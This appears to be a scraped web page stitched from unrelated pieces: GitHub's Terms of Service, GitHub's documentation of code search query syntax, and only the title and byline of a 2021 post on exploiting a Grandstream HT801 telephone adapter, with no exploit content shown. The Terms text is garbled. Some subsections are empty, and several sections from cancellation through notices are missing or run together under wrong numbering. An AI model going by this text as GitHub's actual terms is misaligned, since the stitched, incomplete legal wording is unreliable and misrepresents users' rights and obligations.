## [The GitHub Terms of Service](#the-github-terms-of-service)

Effective date: November 16, 2020

## [A. Definitions](#a-definitions)

**Short version:** *We use these basic terms throughout the agreement, and they have specific meanings. You should know what we mean when we use each of the terms. There's not going to be a test on it, but it's still useful information.*

1. An "Account" represents your legal relationship with GitHub. A “Personal Account” represents an individual User’s authorization to log in to and use the Service and serves as a User’s identity on GitHub. “Organizations” are shared workspaces that may be associated with a single entity or with one or more Users where multiple Users can collaborate across many projects at once. A Personal Account can be a member of any number of Organizations.
2. The “Agreement” refers, collectively, to all the terms, conditions, notices contained or referenced in this document (the “Terms of Service” or the "Terms") and all other operating rules, policies (including the GitHub Privacy Statement, available at [github.com/site/privacy](https://github.com/site/privacy)) and procedures that we may publish from time to time on the Website. Most of our site policies are available at [docs.github.com/categories/site-policy](/en/site-policy).
3. "Beta Previews" mean software, services, or features identified as alpha, beta, preview, early access, or evaluation, or words or phrases with similar meanings.
4. “Content” refers to content featured or displayed through the Website, including without limitation code, text, data, articles, images, photographs, graphics, software, applications, packages, designs, features, and other materials that are available on the Website or otherwise available through the Service. "Content" also includes Services. “User-Generated Content” is Content, written or otherwise, created or uploaded by our Users. "Your Content" is Content that you create or own.
5. “GitHub,” “We,” and “Us” refer to GitHub, Inc., as well as our affiliates, directors, subsidiaries, contractors, licensors, officers, agents, and employees.
6. The “Service” refers to the applications, software, products, and services provided by GitHub, including any Beta Previews.
7. “The User,” “You,” and “Your” refer to the individual person, company, or organization that has visited or is using the Website or Service; that accesses or uses any part of the Account; or that directs the use of the Account in the performance of its functions. A User must be at least 13 years of age. Special terms may apply for business or government Accounts (See [Section B(5): Additional Terms](#5-additional-terms)).
8. The “Website” refers to GitHub’s website located at [github.com](https://github.com/), and all content, services, and products provided by GitHub at or through the Website. It also refers to GitHub-owned subdomains of github.com, such as [education.github.com](https://education.github.com/) and [pages.github.com](https://pages.github.com/). These Terms also govern GitHub’s conference websites, such as [githubuniverse.com](https://githubuniverse.com/), and product websites, such as [electronjs.org](https://www.electronjs.org/). Occasionally, websites owned by GitHub may provide different or additional terms of service. If those additional terms conflict with this Agreement, the more specific terms apply to the relevant page or service.

## [B. Account Terms](#b-account-terms)

**Short version:** *Personal Accounts and Organizations have different administrative controls; a human must create your Account; you must be 13 or over; you must provide a valid email address; and you may not have more than one free Account. You alone are responsible for your Account and anything that happens while you are signed in to or using your Account. You are responsible for keeping your Account secure.*

### [1. Account Controls](#1-account-controls)

* Users. Subject to these Terms, you retain ultimate administrative control over your Personal Account and the Content within it.
* Organizations. The "owner" of an Organization that was created under these Terms has ultimate administrative control over that Organization and the Content within it. Within the Service, an owner can manage User access to the Organization’s data and projects. An Organization may have multiple owners, but there must be at least one Personal Account designated as an owner of an Organization. If you are the owner of an Organization under these Terms, we consider you responsible for the actions that are performed on or through that Organization.

### [2. Required Information](#2-required-information)

You must provide a valid email address in order to complete the signup process. Any other information requested, such as your real name, is optional, unless you are accepting these terms on behalf of a legal entity (in which case we need more information about the legal entity) or if you opt for a [paid Account](#k-payment), in which case additional information will be necessary for billing purposes.

### [3. Account Requirements](#3-account-requirements)

We have a few simple rules for Personal Accounts on GitHub's Service.

* You must be a human to create an Account. Accounts registered by "bots" or other automated methods are not permitted. We do permit machine accounts:
* A machine account is an Account set up by an individual human who accepts the Terms on behalf of the Account, provides a valid email address, and is responsible for its actions. A machine account is used exclusively for performing automated tasks. Multiple users may direct the actions of a machine account, but the owner of the Account is ultimately responsible for the machine's actions. You may maintain no more than one free machine account in addition to your free Personal Account.
* One person or legal entity may maintain no more than one free Account (if you choose to control a machine account as well, that's fine, but it can only be used for running a machine).
* You must be age 13 or older. While we are thrilled to see brilliant young coders get excited by learning to program, we must comply with United States law. GitHub does not target our Service to children under 13, and we do not permit any Users under 13 on our Service. If we learn of any User under the age of 13, we will [terminate that User’s Account immediately](#l-cancellation-and-termination). If you are a resident of a country outside the United States, your country’s minimum age may be older; in such a case, you are responsible for complying with your country’s laws.
* Your login may only be used by one person — i.e., a single login may not be shared by multiple people. A paid Organization may only provide access to as many Personal Accounts as your subscription allows.
* You may not use GitHub in violation of export control or sanctions laws of the United States or any other applicable jurisdiction. You may not use GitHub if you are or are working on behalf of a [Specially Designated National (SDN)](https://www.treasury.gov/resource-center/sanctions/SDN-List/Pages/default.aspx) or a person subject to similar blocking or denied party prohibitions administered by a U.S. government agency. GitHub may allow persons in certain sanctioned countries or territories to access certain GitHub services pursuant to U.S. government authorizations. For more information, please see our [Export Controls policy](/en/site-policy/other-site-policies/github-and-trade-controls).

### [4. Account Security](#4-account-security)

You are responsible for keeping your Account secure while you use our Service. We offer tools such as two-factor authentication to help you maintain your Account's security, but the content of your Account and its security are up to you.

* You are responsible for all content posted and activity that occurs under your Account (even when content is posted by others who have Accounts under your Account).
* You are responsible for maintaining the security of your Account and password. GitHub cannot and will not be liable for any loss or damage from your failure to comply with this security obligation.
* You will promptly notify GitHub by contacting us through the [GitHub Support portal](https://support.github.com/) if you become aware of any unauthorized use of, or access to, our Service through your Account, including any unauthorized use of your password or Account.

### [5. Additional Terms](#5-additional-terms)

In some situations, third parties' terms may apply to your use of GitHub. For example, you may be a member of an organization on GitHub with its own terms or license agreements; you may download an application that integrates with GitHub; or you may use GitHub to authenticate to another service. Please be aware that while these Terms are our full agreement with you, other parties' terms govern their relationships with you.

If you are a government User or otherwise accessing or using any GitHub Service in a government capacity, this [Government Amendment to GitHub Terms of Service](/en/site-policy/site-policy-deprecated/amendment-to-github-terms-of-service-applicable-to-us-federal-government-users) applies to you, and you agree to its provisions.

If you have signed up for GitHub Enterprise Cloud, the [Enterprise Cloud Addendum](/en/site-policy/site-policy-deprecated/github-enterprise-service-level-agreement) applies to you, and you agree to its provisions.

## [C. Acceptable Use](#c-acceptable-use)

**Short version:** *GitHub hosts a wide variety of collaborative projects from all over the world, and that collaboration only works when our users are able to work together in good faith. While using the service, you must follow the terms of this section, which include some restrictions on content you can post, conduct on the service, and other limitations. In short, be excellent to each other.*

Your use of the Website and Service must not violate any applicable laws, including copyright or trademark laws, export control or sanctions laws, or other laws in your jurisdiction. You are responsible for making sure that your use of the Service is in compliance with laws and any applicable regulations.

You agree that you will not under any circumstances violate our [Acceptable Use Policies](/en/site-policy/acceptable-use-policies/github-acceptable-use-policies) or [Community Guidelines](/en/site-policy/github-terms/github-community-guidelines).

## [D. User-Generated Content](#d-user-generated-content)

**Short version:** *You own content you create, but you allow us certain rights to it, so that we can display and share the content you post. You still have control over your content, and responsibility for it, and the rights you grant us are limited to those we need to provide the service. We have the right to remove content or close Accounts if we need to.*

### [1. Responsibility for User-Generated Content](#1-responsibility-for-user-generated-content)

You may create or upload User-Generated Content while using the Service. You are solely responsible for the content of, and for any harm resulting from, any User-Generated Content that you post, upload, link to or otherwise make available via the Service, regardless of the form of that Content. We are not responsible for any public display or misuse of your User-Generated Content.

### [2. GitHub May Remove Content](#2-github-may-remove-content)

We have the right to refuse or remove any User-Generated Content that, in our sole discretion, violates any laws or [GitHub terms or policies](/en/site-policy). User-Generated Content displayed on GitHub Mobile may be subject to mobile app stores' additional terms.

### [3. Ownership of Content, Right to Post, and License Grants](#3-ownership-of-content-right-to-post-and-license-grants)

You retain ownership of and responsibility for Your Content. If you're posting anything you did not create yourself or do not own the rights to, you agree that you are responsible for any Content you post; that you will only submit Content that you have the right to post; and that you will fully comply with any third party licenses relating to Content you post.

Because you retain ownership of and responsibility for Your Content, we need you to grant us — and other GitHub Users — certain legal permissions, listed in Sections D.4 — D.7. These license grants apply to Your Content. If you upload Content that already comes with a license granting GitHub the permissions we need to run our Service, no additional license is required. You understand that you will not receive any payment for any of the rights granted in Sections D.4 — D.7. The licenses you grant to us will end when you remove Your Content from our servers, unless other Users have forked it.

### [4. License Grant to Us](#4-license-grant-to-us)

We need the legal right to do things like host Your Content, publish it, and share it. You grant us and our legal successors the right to store, archive, parse, and display Your Content, and make incidental copies, as necessary to provide the Service, including improving the Service over time. This license includes the right to do things like copy it to our database and make backups; show it to you and other users; parse it into a search index or otherwise analyze it on our servers; share it with other users; and perform it, in case Your Content is something like music or video.

This license does not grant GitHub the right to sell Your Content. It also does not grant GitHub the right to otherwise distribute or use Your Content outside of our provision of the Service, except that as part of the right to archive Your Content, GitHub may permit our partners to store and archive Your Content in public repositories in connection with the [GitHub Arctic Code Vault and GitHub Archive Program](https://archiveprogram.github.com/).

### [5. License Grant to Other Users](#5-license-grant-to-other-users)

Any User-Generated Content you post publicly, including issues, comments, and contributions to other Users' repositories, may be viewed by others. By setting your repositories to be viewed publicly, you agree to allow others to view and "fork" your repositories (this means that others may make their own copies of Content from your repositories in repositories they control).

If you set your pages and repositories to be viewed publicly, you grant each User of GitHub a nonexclusive, worldwide license to use, display, and perform Your Content through the GitHub Service and to reproduce Your Content solely on GitHub as permitted through GitHub's functionality (for example, through forking). You may grant further rights if you [adopt a license](/en/communities/setting-up-your-project-for-healthy-contributions/adding-a-license-to-a-repository#including-an-open-source-license-in-your-repository). If you are uploading Content you did not create or own, you are responsible for ensuring that the Content you upload is licensed under terms that grant these permissions to other GitHub Users.

### [6. Contributions Under Repository License](#6-contributions-under-repository-license)

Whenever you add Content to a repository containing notice of a license, you license that Content under the same terms, and you agree that you have the right to license that Content under those terms. If you have a separate agreement to license that Content under different terms, such as a contributor license agreement, that agreement will supersede.

Isn't this just how it works already? Yep. This is widely accepted as the norm in the open-source community; it's commonly referred to by the shorthand "inbound=outbound". We're just making it explicit.

### [7. Moral Rights](#7-moral-rights)

You retain all moral rights to Your Content that you upload, publish, or submit to any part of the Service, including the rights of integrity and attribution. However, you waive these rights and agree not to assert them against us, to enable us to reasonably exercise the rights granted in Section D.4, but not otherwise.

To the extent this agreement is not enforceable by applicable law, you grant GitHub the rights we need to use Your Content without attribution and to make reasonable adaptations of Your Content as necessary to render the Website and provide the Service.

## [E. Private Repositories](#e-private-repositories)

**Short version:** *We treat the content of private repositories as confidential, and we only access it as described in our Privacy Statement—for security purposes, to assist the repository owner with a support matter, to maintain the integrity of the Service, to comply with our legal obligations, if we have reason to believe the contents are in violation of the law, or with your consent.*

### [1. Control of Private Repositories](#1-control-of-private-repositories)

Some Accounts may have private repositories, which allow the User to control access to Content.

### [2. Confidentiality of Private Repositories](#2-confidentiality-of-private-repositories)

GitHub considers the contents of private repositories to be confidential to you. GitHub will protect the contents of private repositories from unauthorized use, access, or disclosure in the same manner that we would use to protect our own confidential information of a similar nature and in no event with less than a reasonable degree of care.

### [3. Access](#3-access)

GitHub personnel may only access the content of your private repositories in the situations described in our [Privacy Statement](/en/site-policy/privacy-policies/github-privacy-statement#repository-contents).

You may choose to enable additional access to your private repositories. For example:

* You may enable various GitHub services or features that require additional rights to Your Content in private repositories. These rights may vary depending on the service or feature, but GitHub will continue to treat your private repository Content as confidential. If those services or features require rights in addition to those we need to provide the GitHub Service, we will provide an explanation of those rights.

Additionally, we may be [compelled by law](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure) to disclose the contents of your private repositories.

GitHub will provide notice regarding our access to private repository content, unless [for legal disclosure](/en/site-policy/privacy-policies/github-privacy-statement#for-legal-disclosure), to comply with our legal obligations, or where otherwise bound by requirements under law, for automated scanning, or if in response to a security threat or other risk to security.

## [F. Copyright Infringement and DMCA Policy](#f-copyright-infringement-and-dmca-policy)

If you believe that content on our website violates your copyright, please contact us in accordance with our [Digital Millennium Copyright Act Policy](/en/site-policy/content-removal-policies/dmca-takedown-policy). If you are a copyright owner and you believe that content on GitHub violates your rights, please contact us via [our convenient DMCA form](https://github.com/contact/dmca) or by emailing copyright@github.com. There may be legal consequences for sending a false or frivolous takedown notice. Before sending a takedown request, you must consider legal uses such as fair use and licensed uses.

We will terminate the Accounts of [repeat infringers](/en/site-policy/content-removal-policies/dmca-takedown-policy#e-repeated-infringement) of this policy.

## [G. Intellectual Property Notice](#g-intellectual-property-notice)

**Short version:** *We own the service and all of our content. In order for you to use our content, we give you certain rights to it, but you may only use our content in the way we have allowed.*

### [1. GitHub's Rights to Content](#1-githubs-rights-to-content)

GitHub and our licensors, vendors, agents, and/or our content providers retain ownership of all intellectual property rights of any kind related to the Website and Service. We reserve all rights that are not expressly granted to you under this Agreement or by law. The look and feel of the Website and Service is copyright © GitHub, Inc. All rights reserved. You may not duplicate, copy, or reuse any portion of the HTML/CSS, JavaScript, or visual design elements or concepts without express written permission from GitHub.

### [2. GitHub Trademarks and Logos](#2-github-trademarks-and-logos)

If you’d like to use GitHub’s trademarks, you must follow all of our trademark guidelines, including those on our logos page: <https://github.com/logos>.

### [3. License to GitHub Policies](#3-license-to-github-policies)

This Agreement is licensed under this [Creative Commons Zero license](https://creativecommons.org/publicdomain/zero/1.0/). For details, see our [site-policy repository](https://github.com/github/site-policy#license).

## [H. API Terms](#h-api-terms)

**Short version:** *You agree to these Terms of Service, plus this Section H, when using any of GitHub's APIs (Application Provider Interface), including use of the API through a third party product that accesses GitHub.*

Abuse or excessively frequent requests to GitHub via the API may result in the temporary or permanent suspension of your Account's access to the API. GitHub, in our sole discretion, will determine abuse or excessive usage of the API. We will make a reasonable attempt to warn you via email prior to suspension.

You may not share API tokens to exceed GitHub's rate limitations.

You may not use the API to download data or Content from GitHub for spamming purposes, including for the purposes of selling GitHub users' personal information, such as to recruiters, headhunters, and job boards.

All use of the GitHub API is subject to these Terms of Service and the [GitHub Privacy Statement](https://github.com/site/privacy).

GitHub may offer subscription-based access to our API for those Users who require high-throughput access or access that would result in resale of GitHub's Service.

## [I. GitHub Additional Product Terms](#i-github-additional-product-terms)

**Short version:** *You need to follow certain specific terms and conditions for GitHub's various features and products, and you agree to the Supplemental Terms and Conditions when you agree to this Agreement.*

Some Service features may be subject to additional terms specific to that feature or product as set forth in the GitHub Additional Product Terms. By accessing or using the Services, you also agree to the [GitHub Additional Product Terms](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

## [J. Beta Previews](#j-beta-previews)

**Short version:** *Beta Previews may not be supported or may change at any time. You may receive confidential information through those programs that must remain confidential while the program is private. We'd love your feedback to make our Beta Previews better.*

### [1. Subject to Change](#1-subject-to-change)

Beta Previews may not be supported and may be changed at any time without notice. In addition, Beta Previews are not subject to the same security measures and auditing to which the Service has been and is subject. **By using a Beta Preview, you use it at your own risk.**

### [2. Confidentiality](#2-confidentiality)

As a user of Beta Previews, you may get access to special information that isn’t available to the rest of the world. Due to the sensitive nature of this information, it’s important for us to make sure that you keep that information secret.

**Confidentiality Obligations.** You agree that any non-public Beta Preview information we give you, such as information about a private Beta Preview, will be considered GitHub’s confidential information (collectively, “Confidential Information”), regardless of whether it is marked or identified as such. You agree to only use such Confidential Information for the express purpose of testing and evaluating the Beta Preview (the “Purpose”), and not for any other purpose. You should use the same degree of care as you would with your own confidential information, but no less than reasonable precautions to prevent any unauthorized use, disclosure, publication, or dissemination of our Confidential Information. You promise not to disclose, publish, or disseminate any Confidential Information to any third party, unless we don’t otherwise prohibit or restrict such disclosure (for example, you might be part of a GitHub-organized group discussion about a private Beta Preview feature).

**Exceptions.** Confidential Information will not include information that is: (a) or becomes publicly available without breach of this Agreement through no act or inaction on your part (such as when a private Beta Preview becomes a public Beta Preview); (b) known to you before we disclose it to you; (c) independently developed by you without breach of any confidentiality obligation to us or any third party; or (d) disclosed with permission from GitHub. You will not violate the terms of this Agreement if you are required to disclose Confidential Information pursuant to operation of law, provided GitHub has been given reasonable advance written notice to object, unless prohibited by law.

### [3. Feedback](#3-feedback)

We’re always trying to improve of products and services, and your feedback as a Beta Preview user will help us do that. If you choose to give us any ideas, know-how, algorithms, code contributions, suggestions, enhancement requests, recommendations or any other feedback for our products or services (collectively, “Feedback”), you acknowledge and agree that GitHub will have a royalty-free, fully paid-up, worldwide, transferable, sub-licensable, irrevocable and perpetual license to implement, use, modify, commercially exploit and/or incorporate the Feedback into our products, services, and documentation.

## [K. Payment](#k-payment)

**Short version:** *You are responsible for any fees associated with your use of GitHub. We are responsible for communicating those fees to you clearly and accurately, and letting you know well in advance if those prices change.*

### [1. Pricing](#1-pricing)

Our pricing and payment terms are available at [github.com/pricing](https://github.com/pricing). If you agree to a subscription price, that will remain your price for the duration of the payment term; however, prices are subject to change at the end of a payment term.

### [2. Upgrades, Downgrades, and Changes](#2-upgrades-downgrades-and-changes)

* We will immediately bill you when you upgrade from the free plan to any paying plan.
* If you change from a monthly billing plan to a yearly billing plan, GitHub will bill you for a full year at the next monthly billing date.
* If you upgrade to a higher level of service, we will bill you for the upgraded plan immediately.
* You may change your level of service at any time by [choosing a plan option](https://github.com/pricing) or going into your [Billing settings](https://github.com/settings/billing). If you choose to downgrade your Account, you may lose access to Content, features, or capacity of your Account. Please see our section on [Cancellation](#l-cancellation-and-termination) for information on getting a copy of that Content.

### [3. Billing Schedule; No Refunds](#3-billing-schedule-no-refunds)

**Payment Based on Plan** For monthly or yearly payment plans, the Service is billed in advance on a monthly or yearly basis respectively and is non-refundable. There will be no refunds or credits for partial months of service, downgrade refunds, or refunds for months unused with an open Account; however, the service will remain active for the length of the paid billing period. In order to treat everyone equally, no exceptions will be made.

**Payment Based on Usage** Some Service features are billed based on your usage. A limited quantity of these Service features may be included in your plan for a limited term without additional charge. If you choose to use paid Service features beyond the quantity included in your plan, you pay for those Service features based on your actual usage in the preceding month. Monthly payment for these purchases will be charged on a periodic basis in arrears. See [GitHub Additional Product Terms for Details](/en/site-policy/github-terms/github-terms-for-additional-products-and-features).

**Invoicing** For invoiced Users, User agrees to pay the fees in full, up front without deduction or setoff of any kind, in U.S. Dollars. User must pay the fees within thirty (30) days of the GitHub invoice date. Amounts payable under this Agreement are non-refundable, except as otherwise provided in this Agreement. If User fails to pay any fees on time, GitHub reserves the right, in addition to taking any other action at law or equity, to (i) charge interest on past due amounts at 1.0% per month or the highest interest rate allowed by law, whichever is less, and to charge all expenses of recovery, and (ii) terminate the applicable order form. User is solely responsible for all taxes, fees, duties and governmental assessments (except for taxes based on GitHub's net income) that are imposed or become due in connection with this Agreement.

### [4. Authorization](#4-authorization)

### [5. Responsibility for Payment](#5-responsibility-for-payment)

By using the Service, you agree to pay GitHub any charge incurred in connection with your use of the Service.

The Account screen provides a simple, no questions asked cancellation link. We are not able to cancel Accounts in response to an email or phone request.

### [2. Upon Cancellation](#2-upon-cancellation)

We will retain and use your information as necessary to comply with our legal obligations, resolve disputes, and enforce our agreements, but barring legal requirements, we will delete your full profile and the Content of your repositories within 90 days of cancellation or termination (though some information may remain in encrypted backups). This information cannot be recovered once your Account is canceled.

We will not delete Content that you have contributed to other Users' repositories or that other Users have forked.

Upon request, we will make a reasonable effort to provide an Account owner with a copy of your lawful, non-infringing Account contents after Account cancellation, termination, or downgrade. You must make this request within 90 days of cancellation, termination, or downgrade.

### [3. GitHub May Terminate](#3-github-may-terminate)

This section does not affect your non-waivable rights.

### [2. Legal Notice to GitHub Must Be in Writing](#2-legal-notice-to-github-must-be-in-writing)

Communications made through email or GitHub Support's messaging system will not constitute legal notice to GitHub or any of its officers, employees, agents or representatives in any situation where notice to GitHub is required by contract or any law or regulation.

## [P. Release and Indemnification](#p-release-and-indemnification)

**Short version:** *You are responsible for your use of the service. If you harm someone else or get into a dispute with someone else, we will not be involved.*

If you have a dispute with one or more Users, you agree to release GitHub from any and all claims, demands and damages (actual and consequential) of every kind and nature, known and unknown, arising out of or in any way connected with such disputes.

You agree to indemnify us, defend us, and hold us harmless from and against any and all claims, liabilities, and expenses, including attorneys’ fees, arising out of your use of the Website and the Service, including but not limited to your violation of this Agreement, provided that GitHub (1) promptly gives you written notice of the claim, demand, suit or proceeding; (2) gives you sole control of the defense and settlement of the claim, demand, suit or proceeding (provided that you may not settle any claim, demand, suit or proceeding unless the settlement unconditionally releases GitHub of all liability); and (3) provides to you all reasonable assistance, at your expense.

## [Q. Changes to These Terms](#q-changes-to-these-terms)

**Short version:** *We want our users to be informed of important changes to our terms, but some changes aren't that important — we don't want to bother you every time we fix a typo. So while we may modify this agreement at any time, we will notify users of any material changes and give you time to adjust to them.*

We reserve the right, at our sole discretion, to amend these Terms of Service at any time and will update these Terms of Service in the event of any such amendments. We will notify our Users of material changes to this Agreement, such as price increases, at least 30 days prior to the change taking effect by posting a notice on our Website or sending email to the primary email address specified in your GitHub account. Customer's continued use of the Service after those 30 days constitutes agreement to those revisions of this Agreement. For any other modifications, your continued use of the Website constitutes agreement to our revisions of these Terms of Service. You can view all changes to these Terms in our [Site Policy](https://github.com/github/site-policy) repository.

# Understanding GitHub Code Search syntax

You can build search queries for the results you want with specialized code qualifiers, regular expressions, and boolean operations.

## [About code search query structure](#about-code-search-query-structure)

The search syntax in this article only applies to searching code with GitHub code search. Note that the syntax and qualifiers for searching for non-code content, such as issues, users, and discussions, is not the same as the syntax for code search. For more information on non-code search, see [About searching on GitHub](/en/search-github/getting-started-with-searching-on-github/about-searching-on-github) and [Searching on GitHub](/en/search-github/searching-on-github).

Search queries consist of search terms, comprising text you want to search for, and qualifiers, which narrow down the search.

A bare term with no qualifiers will match either the content of a file or the file's path.

For example, the following query:

```
http-push

```

The above query will match the file `docs/http-push.txt`, even if it doesn't contain the term `http-push`. It will also match a file called `example.txt` if it contains the term `http-push`.

You can enter multiple terms separated by whitespace to search for documents that satisfy both terms.

For example, the following query:

```
sparse index

```

The search results would include all documents containing both the terms `sparse` and `index`, in any order. As examples, it would match a file containing `SparseIndexVector`, a file with the phrase `index for sparse trees`, and even a file named `index.txt` that contains the term `sparse`.

Searching for multiple terms separated by whitespace is the equivalent to the search `hello AND world`. Other boolean operations, such as `hello OR world`, are also supported. For more information about boolean operations, see [Using boolean operations](#using-boolean-operations).

Code search also supports searching for an exact string, including whitespace. For more information, see [Query for an exact match](#query-for-an-exact-match).

You can narrow your code search with specialized qualifiers, such as `repo:`, `language:` and `path:`. For more information on the qualifiers you can use in code search, see [Using qualifiers](#using-qualifiers).

You can also use regular expressions in your searches by surrounding the expression in slashes. For more information on using regular expressions, see [Using regular expressions](#using-regular-expressions).

## [Query for an exact match](#query-for-an-exact-match)

To search for an exact string, including whitespace, you can surround the string in quotes. For example:

```
"sparse index"

```

You can also use quoted strings in qualifiers, for example:

```
path:git language:"protocol buffers"

```
## [Searching for quotes and backslashes](#searching-for-quotes-and-backslashes)

To search for code containing a quotation mark, you can escape the quotation mark using a backslash. For example, to find the exact string `name = "tensorflow"`, you can search:

```
"name = \"tensorflow\""

```

To search for code containing a backslash, `\`, use a double backslash, `\\`.

The two escape sequences `\\` and `\"` can be used outside of quotes as well. No other escape sequences are recognized, though. A backslash that isn't followed by either `"` or `\` is included in the search, unchanged.

Additional escape sequences, such as `\n` to match a newline character, are supported in regular expressions. See [Using regular expressions](#using-regular-expressions).

## [Using boolean operations](#using-boolean-operations)

Code search supports boolean expressions. You can use the operators `AND`, `OR`, and `NOT` to combine search terms.

By default, adjacent terms separated by whitespace are equivalent to using the `AND` operator. For example, the search query `sparse index` is the same as `sparse AND index`, meaning that the search results will include all documents containing both the terms `sparse` and `index`, in any order.

To search for documents containing either one term or the other, you can use the `OR` operator. For example, the following query will match documents containing either `sparse` or `index`:

```
sparse OR index

```

To exclude files from your search results, you can use the `NOT` operator. For example, to exclude files in the `__testing__` directory, you can search:

```
"fatal error" NOT path:__testing__

```

You can use parentheses to express more complicated boolean expressions. For example:

```
(language:ruby OR language:python) AND NOT path:"/tests/"

```
## [Using qualifiers](#using-qualifiers)

You can use specialized keywords to qualify your search.

* [Repository qualifier](#repository-qualifier)
* [Organization and user qualifiers](#organization-and-user-qualifiers)
* [Language qualifier](#language-qualifier)
* [Path qualifier](#path-qualifier)
* [Symbol qualifier](#symbol-qualifier)
* [Content qualifier](#content-qualifier)
* [Is qualifier](#is-qualifier)

### [Repository qualifier](#repository-qualifier)

To search within a repository, use the `repo:` qualifier. You must provide the full repository name, including the owner. For example:

```
repo:github-linguist/linguist

```

To search within a set of repositories, you can combine multiple `repo:` qualifiers with the boolean operator `OR`. For example:

```
repo:github-linguist/linguist OR repo:tree-sitter/tree-sitter

```

Note

Code search does not currently support regular expressions or partial matching for repository names, so you will have to type the entire repository name (including the user prefix) for the `repo:` qualifier to work.

### [Organization and user qualifiers](#organization-and-user-qualifiers)

To search for files within an organization, use the `org:` qualifier. For example:

```
org:github

```

To search for files within a personal account, use the `user:` qualifier. For example:

```
user:octocat

```

Note

Code search does not currently support regular expressions or partial matching for organization or user names, so you will have to type the entire organization or user name for the qualifier to work.

### [Language qualifier](#language-qualifier)

To narrow down to a specific languages, use the `language:` qualifier. For example:

```
language:ruby OR language:cpp OR language:csharp

```

For a complete list of supported language names, see [languages.yaml](https://github.com/github-linguist/linguist/blob/main/lib/linguist/languages.yml) in [github-linguist/linguist](https://github.com/github-linguist/linguist). If your preferred language is not on the list, you can open a pull request to add it.

### [Path qualifier](#path-qualifier)

To search within file paths, use the `path:` qualifier. This will match files containing the term anywhere in their file path. For example, to find files containing the term `unit_tests` in their path, use:

```
path:unit_tests

```

The above query will match both `src/unit_tests/my_test.py` and `src/docs/unit_tests.md` since they both contain `unit_test` somewhere in their path.

To match only a specific filename (and not part of the path), you could use a regular expression:

```
path:/(^|\/)README\.md$/

```

Note that the `.` in the filename is escaped, since `.` has special meaning for regular expressions. For more information about using regular expressions, see [Using regular expressions](#using-regular-expressions).

You can also use some limited glob expressions in the `path:` qualifier.

For example, to search for files with the extension `txt`, you can use:

```
path:*.txt

```

To search for JavaScript files within a `src` directory, you could use:
```
path:src/*.js

```

* By default, glob expressions are not anchored to the start of the path, so the above expression would still match a path like `app/src/main.js`. But if you prefix the expression with `/`, it will anchor to the start. For example:

  ```
  path:/src/*.js

  ```
* Note that `*` doesn't match the `/` character, so for the above example, all results will be direct descendants of the `src` directory. To match within subdirectories, so that results include deeply nested files such as `/src/app/testing/utils/example.js`, you can use `**`. For example:

  ```
  path:/src/**/*.js

  ```

You can also use the `?` global character. For example, to match the path `file.aac` or `file.abc`, you can use:

```
path:*.a?c

```

To search for a filename which contains a special character like `\*` or `?`, just use a quoted string:
```
path:"file?"

```

Glob expressions are disabled for quoted strings, so the above query will only match paths containing the literal string `file?`.

### [Symbol qualifier](#symbol-qualifier)

You can search for symbol definitions in code, such as function or class definitions, using the `symbol:` qualifier. Symbol search is based on parsing your code using the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, so no extra setup or build tool integration is required.

For example, to search for a symbol called `WithContext`:

```
language:go symbol:WithContext

```

In some languages, you can search for symbols using a prefix (e.g. a prefix of their class name). For example, for a method `deleteRows` on a struct `Maint`, you could search `symbol:Maint.deleteRows` if you are using Go, or `symbol:Maint::deleteRows` in Rust.

You can also use regular expressions with the symbol qualifier. For example, the following query would find conversions people have implemented in Rust for the `String` type:

```
language:rust symbol:/^String::to_.*/

```

Note that this qualifier only searches for definitions and not references, and not all symbol types or languages are fully supported yet. Symbol extraction is supported for the following languages:

* Bash
* C
* C#
* C++
* CodeQL
* Elixir
* Go
* JSX
* Java
* JavaScript
* Lua
* PHP
* Protocol Buffers
* Python
* R
* Ruby
* Rust
* Scala
* Starlark
* Swift
* Typescript

We are working on adding support for more languages. If you would like to help contribute to this effort, you can add support for your language in the open source [Tree-sitter](https://github.com/tree-sitter) parser ecosystem, upon which symbol search is based.

### [Content qualifier](#content-qualifier)

By default, bare terms search both paths and file content. To restrict a search to strictly match the content of a file and not file paths, use the `content:` qualifier. For example:

```
content:README.md

```

This query would only match files containing the term `README.md`, rather than matching files named `README.md`.

### [Is qualifier](#is-qualifier)

To filter based on repository properties, you can use the `is:` qualifier. `is:` supports the following values:

* `archived`: restricts the search to archived repositories.
* `fork`: restricts the search to forked repositories.
* `vendored`: restricts the search to content detected as vendored.
* `generated`: restricts the search to content detected as generated.

For example:

```
path:/^MIT.txt$/ is:archived

```

Note that the `is:` qualifier can be inverted with the `NOT` operator. To search for non-archived repositories, you can search:

```
log4j NOT is:archived

```

To exclude forks from your results, you can search:

```
log4j NOT is:fork

```
## [Using regular expressions](#using-regular-expressions)

Code search supports regular expressions to search for patterns in your code. You can use regular expressions in bare search terms as well as within many qualifiers, by surrounding the regex in slashes.

For example, to search for the regular expression `sparse.*index`, you would use:

```
/sparse.*index/

```

Note that you'll have to escape any forward slashes within the regular expression. For example, to search for files within the `App/src` directory, you would use:

```
/^App\/src\//

```

Inside a regular expression, `\n` stands for a newline character, `\t` stands for a tab, and `\x{hhhh}` can be used to escape any Unicode character. This means you can use regular expressions to search for exact strings that contain characters that you can't type into the search bar.

Most common regular expressions features work in code search. However, "look-around" assertions are not supported.

## [Separating search terms](#separating-search-terms)

All parts of a search, such as search terms, exact strings, regular expressions, qualifiers, parentheses, and the boolean keywords `AND`, `OR`, and `NOT`, must be separated from one another with spaces. The one exception is that items inside parentheses, `(` `)`, don't need to be separated from the parentheses.

If your search contains multiple components that aren't separated by spaces, or other text that does not follow the rules listed above, code search will try to guess what you mean. It often falls back on treating that component of your query as the exact text to search for. For example, the following query:

```
printf("hello world\n");

```

Code search will give up on interpreting the parentheses and quotes as special characters and will instead search for files containing that exact code.

If code search guesses wrong, you can always get the search you wanted by using quotes and spaces to make the meaning clear.

## [Case sensitivity](#case-sensitivity)

By default, code search is case-insensitive, and results will include both uppercase and lowercase results. You can do case-sensitive searches by using a regular expression with case insensitivity turned off. For example, to search for the string "True", you would use:

```
/(?-i)True/

```

# Exploiting Grandstream HT801 ATA (CVE-2021-37748, CVE-2021-37915)

Published on Oct. 26, 2021 by Adam Simuntis & Mindaugas Slusnys
![Post Image - Grandstream's HT801 Analog Telephone Adapter.png](/media/images/Post_Image_-_Grandstreams_HT801_Analog_Teleph.width-1000.png)

